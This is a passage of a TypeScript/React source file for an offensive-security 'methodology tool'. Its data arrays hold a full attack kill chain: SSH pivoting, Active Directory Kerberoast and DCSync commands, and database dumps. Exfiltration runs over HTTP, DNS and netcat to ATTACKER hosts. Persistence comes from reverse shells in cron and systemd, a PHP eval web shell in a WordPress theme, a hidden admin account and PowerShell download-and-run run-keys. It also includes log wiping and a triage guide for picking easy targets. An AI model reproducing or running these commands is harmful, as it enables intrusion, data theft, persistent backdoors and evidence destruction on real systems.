          { lang: "bash — ssh local + remote forward", code: `# Local forward — reach internal DB through compromised SSH
ssh -L 3306:internal-db:3306 user@compromised

# Remote forward — expose internal HTTP back to attacker
ssh -R 8080:internal-app:80 attacker@your-vps` },
        ],
      },
      {
        id: "6.3", title: "6.3 — Active Directory recon",
        mitre: ["TA0007"],
        blocks: [
          { lang: "bash — from Linux", code: `# BloodHound collect
bloodhound-python -u user -p pass -d corp.local -ns 10.10.10.5 -c All

# Kerberoast (request TGS for SPNs, crack offline)
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.5 -request

# AS-REP roast (users without preauth)
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.5

# DCSync if user has Replication privilege
impacket-secretsdump corp.local/user:pass@10.10.10.5` },
        ],
      },
    ]
  },

  {
    id: "p7", label: "Exfiltration", badge: "Phase 7", color: "bg-green-100 text-green-700",
    sections: [
      {
        id: "7.1", title: "7.1 — Database extraction",
        mitre: ["T1041"],
        blocks: [
          { lang: "bash", code: `# MySQL full dump
mysqldump -h HOST -u USER -p'PASS' --all-databases | gzip > /tmp/db.sql.gz

# PostgreSQL
PGPASSWORD='PASS' pg_dumpall -h HOST -U USER | gzip > /tmp/db.sql.gz

# MongoDB
mongodump --uri="mongodb://USER:PASS@HOST:27017" --gzip --archive=/tmp/mongo.gz

# Redis (RDB snapshot)
redis-cli -h HOST -a PASS --rdb /tmp/dump.rdb` },
        ],
      },
      {
        id: "7.2", title: "7.2 — Exfiltration channels",
        blocks: [
          { lang: "bash — HTTP", code: `# Attacker
python3 -m http.server 8080
# Victim
curl -F "f=@/tmp/db.sql.gz" http://ATTACKER:8080/up

# Cleaner: use a presigned S3 URL if you control the bucket` },
          { lang: "bash — DNS (firewall-bypass)", code: `# Slow, but exits through DNS resolvers
xxd -p -c 32 /tmp/secret | awk '{print NR"."$0}' | while read l; do
  dig "$l.exfil.attacker.tld" +short
done

# DNSExfiltrator handles chunking / framing for you:
python3 dnsExfiltrator.py -d exfil.attacker.tld -f /tmp/secret` },
          { lang: "bash — encrypted via netcat", code: `# Encrypt first
openssl enc -aes-256-cbc -salt -in /tmp/db.sql.gz -out /tmp/db.enc -k "STRONGKEY"

# Attacker
nc -lvnp 9001 > db.enc
# Victim
nc -w 5 ATTACKER 9001 < /tmp/db.enc

# Decrypt
openssl enc -d -aes-256-cbc -in db.enc -out db.sql.gz -k "STRONGKEY"` },
        ],
      },
    ]
  },

  {
    id: "p8", label: "Persistence", badge: "Phase 8", color: "bg-fuchsia-100 text-fuchsia-700",
    sections: [
      {
        id: "8.1", title: "8.1 — Web-app backdoors",
        mitre: ["T1505.003"],
        blocks: [
          { lang: "bash", code: `# Hidden one-liner inside a real theme/plugin file
echo '<?php @eval($_POST["x"]); ?>' >> /var/www/html/wp-content/themes/active/footer.php

# WordPress: hidden admin user
mysql -e "INSERT INTO wp_users(user_login,user_pass,user_email,user_registered) VALUES('svc_backup', MD5('strongPW'), 'svc@corp.tld', NOW());"
mysql -e "INSERT INTO wp_usermeta(user_id,meta_key,meta_value) VALUES(LAST_INSERT_ID(),'wp_capabilities','a:1:{s:13:\\"administrator\\";b:1;}'),(LAST_INSERT_ID(),'wp_user_level','10');"` },
        ],
      },
      {
        id: "8.2", title: "8.2 — OS-level persistence (Linux)",
        mitre: ["T1053.003", "T1543.002"],
        blocks: [
          { lang: "bash", code: `# Cron
(crontab -l 2>/dev/null; echo "*/30 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'") | crontab -

# systemd user-service (survives reboot if user lingers)
mkdir -p ~/.config/systemd/user
cat > ~/.config/systemd/user/u.service <<'EOF'
[Unit]
Description=u
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
Restart=always
[Install]
WantedBy=default.target
EOF
systemctl --user enable --now u.service

# SSH key (least noisy if user has SSH already)
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAA... attacker' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys` },
        ],
      },
      {
        id: "8.3", title: "8.3 — Persistence (Windows)",
        mitre: ["T1547.001", "T1053.005"],
        blocks: [
          { lang: "powershell", code: `# Run-key
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" \\
  -Name "WindowsUpdate" -Value "powershell -w hidden -ep bypass -c IEX(IWR http://ATTACKER/p.ps1 -UseB)"

# Scheduled task (every login)
schtasks /create /tn "Microsoft\\Windows\\AppUpdate" /sc onlogon /tr "powershell.exe -w hidden -ep bypass -c IEX(IWR http://ATTACKER/p.ps1 -UseB)"` },
        ],
      },
    ]
  },

  {
    id: "p9", label: "Cleanup & Report", badge: "Phase 9", color: "bg-zinc-200 text-zinc-700",
    sections: [
      {
        id: "9.1", title: "9.1 — Trace cleanup",
        text: `Only relevant for authorised engagements where you control the cleanup scope.
Document everything before removing.`,
        blocks: [
          { lang: "bash", code: `# Web shells
find /var/www -name 'shell.*' -o -name 'rev.*' -delete 2>/dev/null

# Shell history
unset HISTFILE; history -c
: > ~/.bash_history; : > ~/.mysql_history; : > ~/.python_history

# Apache / nginx access lines mentioning our IP
sed -i "/$(echo $SSH_CLIENT | awk '{print $1}')/d" /var/log/{apache2,nginx}/access.log

# Temp artefacts
rm -rf /tmp/*.sql /tmp/*.tar.gz /tmp/*.enc` },
        ],
      },
      {
        id: "9.2", title: "9.2 — Report template (markdown)",
        text: `# Penetration Test Report — target.com

## 1. Executive Summary
- Engagement window: YYYY-MM-DD → YYYY-MM-DD
- Scope: production web app + supporting subdomains
- Findings: X Critical · Y High · Z Medium · W Low
- Risk level: <CRITICAL | HIGH | MEDIUM>

## 2. Critical Findings
| # | Title                        | CVSS | CVE              | Affected URL            |
|---|------------------------------|------|------------------|-------------------------|
| 1 | Unauthenticated SQLi → RCE   | 9.8  | CVE-2024-XXXXX  | /api/v1/search?q=       |
| 2 | Exposed .env (DB creds)      | 9.1  | -                | /.env                   |
| 3 | LFI → web shell              | 9.0  | -                | /?page=                 |

## 3. Reproduction Steps
For each finding:
  - Pre-conditions
  - HTTP request used
  - Captured response / evidence
  - Impact statement
  - Recommended remediation
  - References (CVE, vendor advisory, OWASP)

## 4. Remediation Roadmap
| Priority | Issue              | Owner       | Patch SLA |
|----------|--------------------|-------------|-----------|
| P0       | SQLi               | Backend     | 24 h      |
| P0       | .env exposed       | Ops         | 2 h       |
| P1       | LFI                | Backend     | 7 d       |
| P2       | Missing headers    | Ops         | 30 d      |

## 5. Appendices
- A — Full tool output
- B — Wordlists / payloads used
- C — Chain diagrams`,
      },
    ]
  },
];

// ---- GENERAL — quick-start playbook ----
const GENERAL_PHASES: Phase[] = [
  {
    id: "g0", label: "Target Triage", badge: "Step 0", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g0.1", title: "0.1 — Pick winnable targets first",
        text: `EASY (high success rate):
  • No WAF / Cloudflare in front
  • Server reports Apache + PHP 5.x / 7.x
  • Outdated CMS (WordPress < 5.0, Joomla 2.x, Drupal 7)
  • Wildcard SAN cert with many forgotten subdomains
  • Numeric / file parameter in URL (?id= / ?page= / ?file=)
  • Visible .git/, /backup/, or directory listings
  • Default panels reachable (/phpmyadmin, /adminer, /manager/html)

HARD (skip unless tasked):
  • Cloudflare + bot-fight + JS challenges
  • Modern stacks fronted by CDN, no exposed origin
  • Active SOC (RUM / WAF logs streaming to SIEM)
  • Frequent deploys (commits in last 7 days)`,
      },
      {
        id: "g0.2", title: "0.2 — 60-second triage script",
        blocks: [
          { lang: "bash", code: `T=$1
echo "== $T =="
curl -sIk "https://$T" | head -8
echo "-- robots --"; curl -sk "https://$T/robots.txt" | head
echo "-- .env --";  curl -sk -o /dev/null -w "%{http_code}\\n" "https://$T/.env"
echo "-- .git --";  curl -sk -o /dev/null -w "%{http_code}\\n" "https://$T/.git/config"
echo "-- admin --"; curl -sk -o /dev/null -w "%{http_code}\\n" "https://$T/admin"
echo "-- phpmyadmin --"; curl -sk -o /dev/null -w "%{http_code}\\n" "https://$T/phpmyadmin/"` },
        ],
      },
    ]
  },

  {
    id: "g1", label: "Recon Sprint", badge: "Step 1", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g1.1", title: "1.1 — Five-command first pass",
        blocks: [
          { lang: "bash", code: `# 1) Subdomains
subfinder -d target.com -all -silent > subs.txt

# 2) Live + tech
cat subs.txt | httpx -silent -tech-detect -title -status-code -follow-redirects -json > live.json
jq -r '.url' live.json > live.txt

# 3) Ports
naabu -list live.txt -top-ports 100 -silent -rate 1000 > ports.txt

# 4) Templates
nuclei -l live.txt -tags cve,kev,exposure,misconfig -severity critical,high -jsonl > vulns.jsonl

# 5) Param mining (passive)
echo target.com | gau --threads 5 | grep -oE 'https?://[^"]*\\?[^"]*' | sort -u > params.txt
wc -l subs.txt live.txt ports.txt vulns.jsonl params.txt` },
        ],
      },
    ]
  },

  {
    id: "g2", label: "Quick Exploit", badge: "Step 2", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g2.1", title: "2.1 — High-yield checks",
        blocks: [
          { lang: "bash — env / git / backup", code: `for h in $(cat live.txt); do
  for p in .env .env.local .env.backup .git/config wp-config.php.bak backup.sql; do
    code=$(curl -sk -o /tmp/b -w "%{http_code}" "$h/$p")
    if [ "$code" = "200" ] && grep -qE "DB_PASSWORD|\\[core\\]|INSERT INTO" /tmp/b; then
      echo "HIT: $h/$p"
    fi
  done
done` },
          { lang: "bash — known panels", code: `for h in $(cat live.txt); do
  curl -sk -o /dev/null -w "[%{http_code}] $h/_ignition/health-check\\n" "$h/_ignition/health-check"
  curl -sk -o /dev/null -w "[%{http_code}] $h/telescope\\n"             "$h/telescope"
  curl -sk -o /dev/null -w "[%{http_code}] $h/server-status\\n"          "$h/server-status"
done | grep -vE '\\[(404|403)\\]'` },
        ],
      },
    ]
  },

  {
    id: "g3", label: "Decision Tree", badge: "Step 3", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g3.1", title: "3.1 — What to attack first",
        text: `Q: Did .env / .git / wp-config.bak leak?
  YES → Pull DB creds → connect directly → game over
  NO  → ↓

Q: Does the target have parameter-rich URLs (?id=, ?file=, ?page=)?
  YES → Run sqlmap + LFI sweep against each
  NO  → ↓

Q: Is there a login form?
  YES → 1) Default creds 2) password spray 3) user enum diff
  NO  → ↓

Q: Did nuclei flag a CVE template?
  YES → Cross-check version, run public PoC
  NO  → ↓

Q: File-upload endpoint exposed?
  YES → ext bypass / polyglot / .htaccess upload
  NO  → ↓

Q: Outdated CMS detected?
  YES → wpscan / joomscan / droopescan, run version-specific exploit
  NO  → Switch target. This one is too hardened for the time-box.`,
      },
    ]
  },

  {
    id: "g4", label: "Loot & Report", badge: "Step 4", color: "bg-zinc-800 text-zinc-300",
    sections: [
      {
        id: "g4.1", title: "4.1 — Evidence to capture per finding",
        text: `For every confirmed vulnerability, store:
  • Exact HTTP request (curl one-liner you can replay)
  • Full response (or first 5 KB)
  • Screenshot of impact (admin panel, DB row, file contents)
  • Timestamp + your IP
  • CVE / OWASP / CWE references
  • One-line "impact" statement targeted at non-tech reader
  • Suggested remediation (config change, patch version, code diff)`,
      },
      {
        id: "g4.2", title: "4.2 — One-liner per phase recap",
        text: `Recon       — subfinder -d T -all -silent | httpx -tech-detect -title
Vulns       — nuclei -l live.txt -tags cve,kev,exposure -severity critical,high
SQLi        — sqlmap -u 'T/?id=1' --batch --dbs --threads 10
LFI         — curl 'T/?page=php://filter/convert.base64-encode/resource=index.php'
RCE shell   — bash -c 'bash -i >& /dev/tcp/A/4444 0>&1'
Privesc     — curl PEASS-ng/linpeas.sh | sh
Loot DB     — mysqldump -h H -u U -p'P' --all-databases | gzip > db.gz
Exfil       — curl -F "f=@db.gz" http://A:8080/up
Persist     — echo '<?php @eval($_POST[x]);?>' >> footer.php`,
      },
    ]
  },
];

// ---- main component ----
export function MethodologyTool() {
  const [activePhase, setActivePhase]   = useState("p0");
  const [activeGeneral, setActiveGeneral] = useState("g0");
  const [view, setView] = useState<"phases" | "general" | "cheatsheet">("phases");

  const phase   = PHASES.find((p) => p.id === activePhase);
  const general = GENERAL_PHASES.find((p) => p.id === activeGeneral);

  const tabs: { id: typeof view; label: string }[] = [
    { id: "phases",     label: "Full Kill Chain" },
    { id: "general",    label: "Quick Playbook" },
    { id: "cheatsheet", label: "Cheat Sheet" },
  ];

  function PhaseNav({ phases, active, onSelect }: {
    phases: Phase[];
    active: string;
    onSelect: (id: string) => void;
  }) {
    return (
      <div className="flex flex-col gap-0.5 min-w-[140px]">
        {phases.map((p) => (
          <button
            key={p.id}
            onClick={() => onSelect(p.id)}
            className={`flex items-center gap-2 rounded px-2.5 py-1.5 text-left text-xs transition-colors border-l-2 ${
              active === p.id
                ? "border-l-fuchsia-500 bg-zinc-800 text-zinc-100"
                : "border-l-transparent text-zinc-500 hover:text-zinc-300 hover:bg-zinc-800"
            }`}
          >
            <span className="rounded bg-zinc-700 px-1 py-0.5 text-[10px] font-bold text-zinc-400">
              {p.badge.split(" ")[1]}
            </span>
            {p.label}
          </button>
        ))}
      </div>
    );
  }

  return (
    <div className="flex flex-col gap-3">
      {/* View toggle */}
      <div className="flex gap-1.5 border-b border-zinc-800 pb-2.5">
        {tabs.map((t) => (
          <button
            key={t.id}
            onClick={() => setView(t.id)}
            className={`rounded px-3 py-1.5 text-xs font-medium transition-colors ${
              view === t.id
                ? "bg-fuchsia-700 text-white"
                : "bg-zinc-800 text-zinc-500 border border-zinc-700 hover:bg-zinc-700"
            }`}
          >
            {t.label}
          </button>
        ))}
      </div>

      {view === "cheatsheet" ? (
        <CheatSheet />
      ) : view === "general" ? (
        <div className="flex gap-4">
          <PhaseNav phases={GENERAL_PHASES} active={activeGeneral} onSelect={setActiveGeneral} />
          <div className="flex-1 space-y-1.5 min-w-0">
            <div className="flex items-center gap-2 mb-2">
              <span className="rounded bg-zinc-800 border border-zinc-700 px-1.5 py-0.5 text-[10px] font-bold text-zinc-400">
                {general?.badge}
              </span>
              <h3 className="text-xs font-semibold text-zinc-300">{general?.label}</h3>
            </div>
            {general?.sections.map((s) => (
              <SectionBlock key={s.id} s={s} />
            ))}
          </div>
        </div>
      ) : (
        <div className="flex gap-4">
          <PhaseNav phases={PHASES} active={activePhase} onSelect={setActivePhase} />
          <div className="flex-1 space-y-1.5 min-w-0">
            <div className="flex items-center gap-2 mb-2">
              <span className="rounded bg-zinc-800 border border-zinc-700 px-1.5 py-0.5 text-[10px] font-bold text-zinc-400">
                {phase?.badge}
              </span>
              <h3 className="text-xs font-semibold text-zinc-300">{phase?.label}</h3>
            </div>
            {phase?.sections.map((s) => (
              <SectionBlock key={s.id} s={s} />
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
